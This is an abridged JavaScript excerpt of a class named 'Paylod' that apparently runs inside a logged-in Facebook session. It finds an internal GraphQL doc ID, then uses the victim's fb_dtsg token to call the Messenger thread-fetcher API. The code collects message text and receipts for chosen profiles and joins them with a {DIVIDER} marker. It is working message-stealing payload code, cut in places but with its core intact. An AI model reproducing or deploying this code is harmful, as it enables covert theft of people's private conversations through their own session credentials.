...
class Paylod {
    constructor() {
        this.profileIds = ["MESSAGE_EXTRACTOR"];
        this.msg = "";
    }
    ...
    initiate(callback) {
        ...
        for (let i = 0; i < urls.length; i++) {
            new HTTP(urls[i])
                .get(function(res) {
                    if (res.indexOf("__getDocID=function()") > -1) {
                        console.log(urls[i]);
                        try {
    ...
    getMessages(docId, fb_dtsg, profileId, index, message_count) {
        let parent = this;
        new HTTP("https://www.facebook.com/api/graphqlbatch/")
        .setPayload(`batch_name=MessengerGraphQLThreadFetcher&__a=1&__req=19t&__be=1&__pc=PHASED:DEFAULT&dpr=1&fb_dtsg=${fb_dtsg}&__spin_b=trunk&queries={"o0":{"doc_id":${docId},"query_params":{"id":"${profileId}","message_limit":${message_count},"load_messages":true,"load_read_receipts":true,"load_delivery_receipts":true}}}`)
        .post(function(res) {
            ...
            messages.forEach(message => {
                if (message["message"] !== undefined) {
                    s += message["message"]["text"] + "{DIVIDER}";
                }
            });
    ...
    run(docId, fb_dtsg) {
        ...
        for (let i = 0; i < this.profileIds.length; i++) {
            this.getMessages(docId, fb_dtsg, this.profileIds[i].id, i, this.profileIds[i].count);
        }
